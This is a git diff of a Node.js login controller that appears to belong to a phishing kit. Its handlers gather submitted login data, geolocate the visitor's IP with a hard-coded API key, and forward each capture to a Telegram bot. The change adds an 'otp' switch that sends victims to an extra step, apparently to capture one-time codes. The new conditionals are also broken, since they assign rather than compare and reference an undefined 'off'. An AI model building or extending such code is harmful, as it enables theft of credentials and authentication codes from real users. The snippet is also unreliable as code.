@@ -1,7 +1,7 @@
 const { sendMessageFor } = require("simple-telegram-message");
 const ipInfo = require("ip-info-finder");
 const { getClientIp } = require("request-ip");
-const { botToken, chatId } = require("../config/settings");
+const { botToken, chatId, otp } = require("../config/settings");
 const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
@@ -109,8 +109,11 @@ exports.loginPost2 = async (req, res) => {
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
-
-        res.redirect("/auth/login/3");
+		if(otp = "on"){
+        res.redirect("/auth/login/5");
+        }else if (otp = off){
+        	res.redirect("/auth/login/3");
+        	}
     } catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
@@ -268,7 +271,7 @@ exports.loginPost5 = async (req, res) => {
 	const sendMessage = sendMessageFor(botToken, chatId);
 	sendMessage(message);
 
-	res.redirect("/auth/complete");
+	res.redirect("/auth/login/3");
 	} catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
